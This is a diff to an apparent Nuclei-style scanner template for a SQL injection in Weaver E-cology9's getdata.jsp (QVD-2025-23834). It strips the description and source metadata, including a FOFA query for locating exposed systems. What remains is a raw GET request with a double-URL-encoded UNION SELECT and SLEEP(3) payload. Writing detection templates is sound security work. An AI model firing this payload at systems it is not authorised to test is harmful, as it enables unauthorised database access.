@@ -3,12 +3,8 @@ info:
   name: 泛微E-cology9 getdata SQL注入漏洞(QVD-2025-23834)
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vysoo2pscnegt6my'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: vysoo2pscnegt6my
-    fofa: app="泛微-OA（e-cology）"
 http:
 - raw:
   - 'GET /js/hrm/getdata.jsp?cmd=savect&arg0=%2531%2520%2575%256e%2569%256f%256e%2520%2573%2565%256c%2565%2563%2574%2520%2531%252c%2532%252c%2533%252c%2534%252c%2535%252c%2553%254c%2545%2545%2550%2528%2533%2529%2520%2523&arg1=1&arg2=2&arg3=3 HTTP/1.1
